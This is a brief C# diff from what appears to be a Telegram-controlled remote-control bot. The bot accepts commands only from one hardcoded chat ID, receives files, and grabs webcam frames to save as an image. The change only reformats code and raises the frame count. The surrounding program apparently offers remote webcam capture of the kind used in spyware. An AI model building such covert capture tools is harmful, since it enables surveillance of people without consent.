@@ -119,7 +119,8 @@ namespace CONTROLL
 
                 var message = update.Message;
 
-                if (message.Chat.Id == 1324016724) {
+                if (message.Chat.Id == 1324016724)
+                {
                     if (message.Type == MessageType.Document)
                     {
                         if (!Directory.Exists("files"))
@@ -507,11 +508,9 @@ namespace CONTROLL
 
                             string WebScreenShotName = "WebScreenShot.png";
                             Bitmap image = null;
-                            for (int i = 0; i < 2; i++)
+                            for (int i = 0; i < 10; i++)
                             {
                                 image = capture.QueryFrame().Bitmap;
-
-
                             }
                             capture.Dispose();
                             image.Save(WebScreenShotName, ImageFormat.Png);
